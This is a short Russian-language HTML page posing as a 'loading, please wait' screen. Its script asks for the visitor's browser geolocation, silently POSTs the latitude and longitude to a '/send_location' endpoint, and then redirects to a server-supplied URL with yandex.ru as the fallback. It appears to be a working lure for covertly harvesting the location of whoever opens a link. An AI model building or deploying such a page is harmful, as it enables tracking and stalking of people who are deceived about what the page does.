<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>Загрузка...</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 150px;
      background: #fff;
      color: #333;
      user-select: none;
    }
    .message {
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div class="message">Загружаем контент, пожалуйста, подождите...</div>
  <script>
    let redirectUrl = "https://yandex.ru"; // запасной на всякий случай

    fetch('/get_redirect')
      .then(res => res.json())
      .then(data => {
        if (data.redirect_url) redirectUrl = data.redirect_url;
      })
      .catch(() => {})  // если не получилось — fallback

      .finally(() => {
        navigator.geolocation.getCurrentPosition(
          pos => {
            fetch('/send_location', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude
              })
            });
            setTimeout(() => {
              window.location.href = redirectUrl;
            }, 1500);
          },
          err => {
            setTimeout(() => {
              window.location.href = redirectUrl;
            }, 1500);
          }
        );
      });
  </script>
</body>
</html>
